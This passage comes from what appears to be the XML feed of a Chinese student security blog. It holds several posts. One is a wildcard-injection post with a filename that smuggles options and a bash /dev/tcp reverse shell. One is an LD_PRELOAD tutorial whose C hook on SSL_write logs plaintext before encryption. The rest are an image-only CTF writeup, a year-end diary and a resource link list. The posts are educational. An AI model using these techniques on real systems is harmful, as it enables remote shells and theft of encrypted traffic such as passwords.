&#x2F;&#x2F;这条命令是把当前目录下的所有文件复制到远程主机foo的&#x2F;home&#x2F;hack目录下</span><br></pre></td></tr></table></figure><p>我们设下陷阱加以利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt;&quot;-e &#x2F;bin&#x2F;sh shell.sh&quot; &#x2F;&#x2F;创建文件名为 -e &#x2F;bin&#x2F;sh shell.sh</span><br><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&quot; &gt; shell.sh &#x2F;&#x2F;执行反弹命令脚本</span><br></pre></td></tr></table></figure><p>本文所讨论的技术可以以各种形式应用于unix和linux下的命令，不仅限于文中介绍到，这需要你发挥你富有创造力的想象，在实际攻击中，往往能起到克敌制胜的关键，柳暗花明又一村的感觉。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 通配符注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>共享对象注入</title>
      <link href="2020/11/04/%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/"/>
      <url>2020/11/04/%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>“如何在不解密的情况下，破解SSL的明文数据？那当然是不要让明文加密了！逻辑鬼才不容反驳”</p></blockquote><h3 id="首先，我们得了解一下基础知识"><a href="#首先，我们得了解一下基础知识" class="headerlink" title="首先，我们得了解一下基础知识"></a>首先，我们得了解一下基础知识</h3><p><strong>程序库可分三类：静态库，共享库和动态加载库</strong></p><p>静态库，是在执行程序运行前就已经加入到执行码中，在物理上成为执行程序的一部分；</p><p>共享库，是在执行程序启动时被加载到执行程序中，这样的库可以被多个执行程序共享使用。</p><p>动态加载库，其实并不是一种真正的库类型，应该是一种库的使用技术，应用程序可以在运行过程中随时加载和使用库。</p><p>总的来说，可执行文件加载库的方式有两种：动态加载，静态写入</p><p>第一种库加载方式，是指程序在启动时才会动态调用库函数以及一些功能。</p><p>第二种库直接就加载写入到可执行文件源代码，所以这样的可执行文件一般都很大。</p><h3 id="补充（小课堂）："><a href="#补充（小课堂）：" class="headerlink" title="补充（小课堂）："></a>补充（小课堂）：</h3><p>加载时间：软件在运行之前，它需要一定的加载时间，用来加载库，和加载到内存。</p><p>函数倒挂：是指用于拦截对现有函数的调用并对其进行环绕以在运行时修改函数行为的一系列技术。通俗一点，在函数调用时强行增加一个我们能控制的环节！</p><p>两种加载方式各有优缺点，今天我们要讲的是动态加载共享库的一些骚操作！</p><h3 id="程序加载时的函数劫持"><a href="#程序加载时的函数劫持" class="headerlink" title="程序加载时的函数劫持"></a>程序加载时的函数劫持</h3><p>我们拿到一个程序可以先看看它所调用的函数及功能，在linux中，可以用readelf，objdump 工具查看，当然你直接ida打开，查看也是没毛病的！</p><p>我们先试试简单的劫持</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1822281002.png"></p><p>这个简单的test程序，执行叫打印zhe bo hen  hacker！，我们应该怎样才能控制它，打印出我们<br>想要的zhe  bo  hen  nice！勒？<br>编辑libc_puts.c，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">puts</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *message)</span> </span>&#123;<span class="comment">/*这里应与原函数保持一致！*/</span></span><br><span class="line">  <span class="keyword">int</span> (*new_puts)(<span class="keyword">const</span> <span class="keyword">char</span> *message);<span class="comment">/*定义一个指针变量*/</span></span><br><span class="line">  new_puts = dlsym(RTLD_NEXT, <span class="string">&quot;puts&quot;</span>);<span class="comment">/*指针变量存储原puts函数的地址*/</span></span><br><span class="line">  <span class="keyword">return</span> new_puts(<span class="string">&quot;zhe bo hen nice!&quot;</span>);<span class="comment">/*替换其传入的参数字符串，从而得到我们想要的*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dlsym函数作用是初始化函数指针，传入此函数的第一个参数RTLD_NEXT告诉动态加载程序API，返回第二个参数字符串的一个实例，本例就是puts 原函数。</p><p>然后编译成库文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc libc_puts.c -fPIC -shared -ldl -D_GNU_SOURCE -o libc_puts</span><br></pre></td></tr></table></figure><p>参数详解：</p><p>我们通过指定-shared和-fPIC编译标志将libc_puts.c编译为共享库，并使用-ldl标志针对libdl进行链接,指定-D_GNU_SOURCE标志以满足#ifdef条件，该条件允许我们使用RTLD_NEXT枚举,通过枚举我们才能找到原函数puts,当然也可以通过在libc_puts.c文件顶部添加“ #define _GNU_SOURCE”来替换此标志。</p><p>这时候我们使用export命令将LD_PRELOAD环境变量指向新创建的libc_puts共享库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD&#x3D;&quot;&#x2F;home&#x2F;hacker&#x2F;test&#x2F;libc_puts.so&quot;</span><br></pre></td></tr></table></figure><p>然后运行test文件，我们将打印的内容给替换了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1271906983.png"></p><p>LD_PRELOAD环境变量用于指定要由加载程序首先加载的共享库，首先加载共享库使我们能够拦截函数调用，并且使用动态加载程序API，我们可以将最初想要的puts函数绑定到函数指针，并通过它传递我们能控制的参数，从而有效地劫持函数调用。</p><blockquote><p>我们已经熟悉了程序加载时的函数劫持技术，接下来，我们将用于实际操作</p></blockquote><p>接下来我们将假设一个实际的应用场景，我们拿到了一个应用程序进行渗透测试，该应用程序使用的是openssl加密敏感数据的传输，嗅探流量包，在没有获得私钥的情况下，我们无法拿到我们想要的敏感信息，这时候我们该怎么办？</p><p>为了获得敏感数据，我们将劫持SSL_write函数的调用，该函数负责加密然后通过套接字发送数据。劫持该函数，我们将绕过加密保护，获得原始的要被加密的传输的字符串，首先我们来看看SSL_write函数的定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int SSL_write （SSL * ssl，const void * buf，int num ）;</span><br></pre></td></tr></table></figure><p>我们创建libc_ssl_write.c文件，内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/ssl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SSL_write</span><span class="params">(SSL *context, <span class="keyword">const</span> <span class="keyword">void</span> *buffer, <span class="keyword">int</span> bytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> (*new_ssl_write)(SSL *context, <span class="keyword">const</span> <span class="keyword">void</span> *buffer, <span class="keyword">int</span> bytes);</span><br><span class="line">  new_ssl_write = dlsym(RTLD_NEXT, <span class="string">&quot;SSL_write&quot;</span>);</span><br><span class="line">  FILE *logfile = fopen(<span class="string">&quot;logfile&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(logfile, <span class="string">&quot;Process %d:nn%snnn&quot;</span>, getpid(), (<span class="keyword">char</span> *)buffer);<span class="comment">/*这里增加了获得进程号的一项功能，这会数据来路更加清晰！，便于我们查看*/</span></span><br><span class="line">  fclose(logfile);<span class="comment">/*把原始要被加密的字符串写入一个文件logfile*/</span></span><br><span class="line">  <span class="keyword">return</span> new_ssl_write(context, buffer, bytes);<span class="comment">/*还是返回加密得字符串，确保不破坏程序的正常功能*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SSL_write函数需要三个参数：指向ssl上下文的指针，指向要加密的字符串缓冲区指针，以及要写入的字节数。</p><p>然后编译：（注意，如果没有openssl/ssl.h库会报错，apt下载就行了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc libc_ssl_write.c -o libc_ssl_write -fPIC -shared -lssl -D_GNU_SOURCE</span><br></pre></td></tr></table></figure><p>用export命令将LD_PRELOAD环境变量指向新创建的libc_ssl_write共享库</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/656147971.png"></p><p>这里我用wget工具去下载百度的主页，正常来说请求的数据包会被加密，但是我们直接在加密之前把传入的数据包内容写入了logfile文件里，这样我们就可以获得敏感数据了。</p><p>如果一个黑客潜入到一台主机里，然后偷偷替换了共享库，劫持了ssl_write函数，将你所以需要经过ssl加密传输的数据写入一个文件，假如你登入输入你的银行卡账户秘密什么的，黑客根本不需要时刻监视这台主机，只需要定期来查看logfile文件内容就可以了。</p><p>当然这是一种利用方式，因为我们创建的共享库将被加载到正在运行的进程的内存空间中，因此我们可以执行诸如转储进程的内存以在运行时检查内存或篡改运行时变量之类的事情，这将变得更加危险。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 共享对象注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-web入门-信息搜集</title>
      <link href="2020/11/01/ctfshow-web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>2020/11/01/ctfshow-web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考资料：<a href="https://blog.csdn.net/a597934448/article/details/105431367">https://blog.csdn.net/a597934448/article/details/105431367</a></p></blockquote><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1065173282.png"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3267216684.png"></p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3867703243.png"></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4214956640.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/235136532.png"></p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4073553634.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/176519077.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2894530419.png"></p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1898524929.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2828602541.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3253027381.png"></p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3732467584.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1235846651.png"></p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2040094773.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3089578362.png"></p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/500588266.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/441315421.png"></p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2994603857.png"></p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3875009964.png"></p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3576419469.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2499309695.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1528627799.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1528627799%20(1).png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3816970691.png"></p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1883578652.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/67120606.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4012715523.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1345272445.png"></p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3536465236.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3978869054.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1131000910.png"></p><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3627398352.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1277343370.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3321910425.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2612947482.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2905094112.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3222540757.png"></p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1833872717.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1124225678.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4036923169.png"></p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3194245228.png"></p><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/590871930.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3579305911.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2720214617.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1020918645.png"></p><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2291258854.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3917635989.png"></p><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2089687022.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2073303903.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再见2020，你好2021！</title>
      <link href="2020/10/28/%E5%86%8D%E8%A7%812020%EF%BC%8C%E4%BD%A0%E5%A5%BD2021/"/>
      <url>2020/10/28/%E5%86%8D%E8%A7%812020%EF%BC%8C%E4%BD%A0%E5%A5%BD2021/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原本身为<strong>懒狗</strong>的我是不准备写这<strong>年度总结</strong>滴QAQ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3896961981.png"></p><p><strong>but</strong> 跨年夜外面就和<strong>打战</strong>一样一炮接一炮（吵死个人），最终爬起来简单写一下总结</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2789148925.png"></p><h1 id="2020"><a href="#2020" class="headerlink" title="2020"></a>2020</h1><p>2020年初由于疫情不用去学校使得我有大把时间浪，老赛棍的我参加了许多场比赛（签到选手~）也正是因此认识许多志群道和的师傅们，期间泻药0kami邀请加入了N1ce一起打比赛，感谢各位陪伴我一起走过了那段可能让我很无聊的时光！</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/281048712.png"></p><p>接着就到了一年两度的期末考了，感谢线上考试让我轻松及格以及电路分析补考顺利过关~nice！对了，考前参加的DozerCTF还拿了个优(安)秀(慰)奖</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1131924316.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2759603271.png"></p><p>接着就是一波安逸的暑假</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1066182434.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3957289886.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2896770062.png"></p><p>还有好多就不一一列出了~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/907688659.png"></p><p>很快就通知开学了，得去学校了（有一说一我是真不想去学校QAQ）好日子就这样没了<br>一到学校就各种奇奇怪怪的规矩（突然想阴阳怪气~不过渣渣二本也就这样了，认命吧</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/276839316.png"></p><p><strong>大过年的还是整喜庆点⑧</strong><br>√<br>开学后我就大二啦，喜提学长称号</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3885537572.png"></p><p>由于我们学校断层了，开学后我接手了网络安全协会的会长一职（本人其实并不是很想当<br>接着就是一年一度的网络安全宣传周，各地省赛接踵而至，我们大福建当然也不列外，不过由于疫情，百越杯被冲掉，黑盾杯变成线上赛，不过工控进入决赛使得我有幸去了人生第一次线下赛（五星级酒店旅游≥ ≤）这也是DJ最后一次带我打比赛了~</p><p>我们住的五星级大酒店</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4038622941.png"></p><p>比赛现场</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2637872104.png"></p><p>当然还有小姐姐（手动滑稽</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3331148832.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/186521305.png"></p><p>蒙蒙细雨下等领导来拍的大合照，猜猜我在哪呀 &gt;&lt;</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1078722651.png"></p><p>同时和我的好兄弟SDD一起经营了一个公众号取名这波很hacker并且很成功，三个月（9-12）粉丝量破五千，我作为团队中的一员深感荣幸！12月我们更名Gamma实验室，团队越做越大，越做越强！很高兴这一路上有你们陪伴！</p><p>对了，2020的新生比我们整整晚开学一个多月…然后我们协会首次亮相学校社团嘉年华（照片不见了~）成功完成纳新工作。（bie：下次把图书馆屏幕日了就显示我们网络安全协会，再把舞台音响搞进去…）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/160894819.png"></p><p>之后准备举办校赛，并且成功拉到于晨国际IT赞助我们本次比赛，还算不错~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/620707834.png"></p><p>就这样摸鱼了一学期，因为这学期有大物，数电等恶心课程，为了不挂科我不得不花上点功夫准备，就这样我成为了我们宿舍唯一一个没有挂科的（我：不会真有人挂了吧）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/231189754.png"></p><h1 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h1><p>点亮2021：<br>只要对理想足够坚定，一路上自然会收获支持和共鸣！（我呸~年少不知软饭香，错把青春学渗透）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/105924743.png"></p><p>最后祝愿Gamma实验室越来越好！各位师傅们多带带我~</p><h1 id="文末福利-大红包"><a href="#文末福利-大红包" class="headerlink" title="文末福利-大红包"></a>文末福利-大红包</h1><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2896322130.png"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习资料</title>
      <link href="2020/10/28/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"/>
      <url>2020/10/28/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2988852155.webp"></p><p>相信我！真的都是学习资料哦~~<br>大泽恵+朝河兰+黒沢爱+早阪ひとみ(早阪曈)+来生ひかり(来生光)+星崎未来+苍井そら(苍井空)+高树マリア(高树玛丽亚)+美竹凉子+松岛かえで(松岛枫)+南波杏+吉沢明歩+小泉彩+桜朱音+香山圣+白鸟さくら(白鸟樱)</p><h2 id="靶机资源合集"><a href="#靶机资源合集" class="headerlink" title="靶机资源合集"></a>靶机资源合集</h2><h3 id="DC靶机1-9"><a href="#DC靶机1-9" class="headerlink" title="DC靶机1-9"></a>DC靶机1-9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1FKj5puh7FvsvxzfjAr8uDQ</span><br><span class="line">提取码：qlm9</span><br></pre></td></tr></table></figure><p>下载解压，用vm，或者vbox打开<br>设置网络配置器为与攻击机一个网段，即可开始渗透测试！</p><h3 id="哆啦实战靶场"><a href="#哆啦实战靶场" class="headerlink" title="哆啦实战靶场"></a>哆啦实战靶场</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1vt-lGt86sNLJd77a0QD8gA</span><br><span class="line">提取码：ktfs</span><br></pre></td></tr></table></figure><p><strong>搭建方法</strong></p><p>准备工具：phpstudy，哆啦靶场源码<br>运行phpstudy，解压哆啦源码到网站的根目录下<br>浏览器打开靶场<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021500758.png"></p><p>先安装sqli的数据库，进去sql练习靶场，点击建立数据库</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2244398992.png"></p><p>会发现出现这样的错误页面</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2623449734.png"></p><p>这是因为没有连接上数据库<br>打开连接数据库的配置文件，修改连接的账户信息</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3122021978.webp"></p><p>在dbpass中填入本地mysql数据库root账号的密码，一般phpstudy数据库密码为root，如果没改的话</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3910040810.png"></p><p>然后在进入网页，创建数据库。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2742581375.png"></p><p>成功了，然后就可以愉快的注入了</p><hr><h2 id="编程资源合集"><a href="#编程资源合集" class="headerlink" title="编程资源合集"></a>编程资源合集</h2><h3 id="python网络安全编程"><a href="#python网络安全编程" class="headerlink" title="python网络安全编程"></a>python网络安全编程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1KI-ULRZnErj0DIt8gWQeig</span><br><span class="line">提取码：lfrd</span><br></pre></td></tr></table></figure><h3 id="python400集："><a href="#python400集：" class="headerlink" title="python400集："></a>python400集：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1hchZtN_XmQi2RFMByzB4Bw</span><br><span class="line">提取码：07w7</span><br></pre></td></tr></table></figure><h3 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1CddqFNMrdIkfBD7Q4kf3yg</span><br><span class="line">提取码：re14</span><br></pre></td></tr></table></figure><h3 id="php高级教程"><a href="#php高级教程" class="headerlink" title="php高级教程"></a>php高级教程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1rsJmIZpwwmftvnlujD_1Ww</span><br><span class="line">提取码：7wfm</span><br></pre></td></tr></table></figure><h3 id="PHP与mysql"><a href="#PHP与mysql" class="headerlink" title="PHP与mysql"></a>PHP与mysql</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;16ZsYk1jSnUfvg3D3CH3koQ</span><br><span class="line">提取码：njb2</span><br></pre></td></tr></table></figure><h3 id="PHP从入门到精通"><a href="#PHP从入门到精通" class="headerlink" title="PHP从入门到精通"></a>PHP从入门到精通</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;16OdAoJ70uqmJgMcD6LZkEQ</span><br><span class="line">提取码：jg1v</span><br></pre></td></tr></table></figure><h3 id="WEB开发"><a href="#WEB开发" class="headerlink" title="WEB开发"></a>WEB开发</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1LuYoKmDIlqJ4mgV_pJBMYA</span><br><span class="line">提取码：iu7e</span><br></pre></td></tr></table></figure><h3 id="JS教程"><a href="#JS教程" class="headerlink" title="JS教程"></a>JS教程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1KAycKKjtwvuVqpU7QayGXQ</span><br><span class="line">提取码：xuc3</span><br></pre></td></tr></table></figure><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Umirm6Y7JqpIwdPBGysjNw</span><br><span class="line">提取码：95i0</span><br></pre></td></tr></table></figure><h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><figure class="highlight plain"><table><tr><td 